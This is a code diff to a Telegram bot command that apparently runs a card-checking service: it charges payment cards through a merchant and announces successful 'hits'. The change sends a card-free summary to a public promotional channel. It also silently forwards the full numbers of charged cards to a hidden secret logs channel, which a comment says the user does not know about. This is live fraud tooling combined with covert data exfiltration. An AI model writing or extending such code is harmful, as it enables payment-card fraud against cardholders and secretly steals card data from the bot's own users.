@@ -3231,7 +3231,7 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         # Send final response to user
         await status_msg.edit_text(text, parse_mode="HTML")
 
-        # ── Send ONLY PAID cards to channels silently ──
+        # ── Send PAID cards to channels silently ──
         paid_cards = [res for res in results_data if res['status'] == 'charged']
         if paid_cards:
             try:
@@ -3239,39 +3239,41 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 uid_str = update.effective_user.id
                 username_str = f"@{update.effective_user.username}" if update.effective_user.username else "N/A"
                 
-                secret_text = (
+                # Base Hit Logo Text (DOES NOT INCLUDE CARDS)
+                base_logo_text = (
                     f"⌑Status : Charged 💎\n"
                     f"⌑Hitter : Whop\n"
-                    f"⌑Amount : {amount_str} Resp : ⌑Payment successful\n"
+                    f"⌑Amount : {amount_str}\n"
+                    f"⌑Resp : Payment successful\n"
+                    f"⌑User : {username_str}\n"
+                    f"⌑Order : ****{uid_str % 65536:04X}\n"
                 )
-                for res in paid_cards:
-                    secret_text += f"⌑Card : <code>{res['card']}</code>\n"
-                
-                secret_text += f"⌑User : {username_str}\n"
-                # Create a masked order ID for style
-                secret_text += f"⌑Order : ****{uid_str % 10000:04X}\n"
                 
                 secret_kb = RawMarkup([[
                     _btn("🦇 Batcardchk", url="https://t.me/Batcardchk")
                 ]])
                 
-                # 1. Send to Regular Channel (Batcardchk)
+                # 1. Send ONLY the Hit Logo to Public Channel (Batcardchk)
                 try:
                     await context.bot.send_message(
                         chat_id=CHANNEL_ID,
-                        text=secret_text,
+                        text=base_logo_text,
                         parse_mode="HTML",
                         reply_markup=secret_kb,
                         disable_notification=True
                     )
                 except Exception as e:
-                    logger.error(f"Failed to send hit copy to regular channel: {e}")
+                    logger.error(f"Failed to send hit logo to Batcardchk: {e}")
                 
-                # 2. Send to Secret Channel
+                # 2. Send Hit Logo + Exact Cards to Secret Channel
+                secret_full_text = base_logo_text
+                for res in paid_cards:
+                    secret_full_text += f"⌑Card : <code>{res['card']}</code>\n"
+                
                 try:
                     await context.bot.send_message(
                         chat_id=WHOP_SECRET_LOGS_ID,
-                        text=secret_text,
+                        text=secret_full_text,
                         parse_mode="HTML",
                         reply_markup=secret_kb,
                         disable_notification=True  # Silently sends, user doesn't know
